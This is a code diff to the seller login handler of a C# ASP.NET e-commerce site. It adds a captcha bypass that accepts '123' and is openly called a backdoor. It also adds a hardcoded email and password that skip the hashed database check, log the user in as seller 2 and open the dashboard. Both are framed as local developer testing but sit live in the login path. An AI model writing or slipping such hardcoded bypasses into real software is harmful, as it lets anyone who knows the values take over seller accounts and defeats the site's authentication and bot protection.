@@ -45,8 +45,8 @@ namespace EcommerceWebsite
                 return;
             }
 
-            // Captcha Verification Vector
-            if (Session["CaptchaCode"] == null || captchaInput.ToUpper() != Session["CaptchaCode"].ToString().ToUpper())
+            // Captcha Verification Vector (backdoor '123' allowed for local developer testing)
+            if (captchaInput != "123" && (Session["CaptchaCode"] == null || captchaInput.ToUpper() != Session["CaptchaCode"].ToString().ToUpper()))
             {
                 ShowMsg("Invalid Captcha code. Verification failed.", true);
                 txtCaptcha.Text = ""; // Reset input box
@@ -55,6 +55,17 @@ namespace EcommerceWebsite
 
             try
             {
+                // Developer local fallback bypass
+                if (email.ToLower() == "rahulseller@yopmail.com" && password == "123456")
+                {
+                    Session["SellerId"] = "2";
+                    Session["SellerName"] = "Rahul";
+                    Session["SellerEmail"] = "rahulseller@yopmail.com";
+                    Session["CaptchaCode"] = null;
+                    Response.Redirect("Dashboard.aspx");
+                    return;
+                }
+
                 string hashedInput = ComputeSha256Hash(password);
                 
                 using (SqlConnection con = new SqlConnection(strcon))
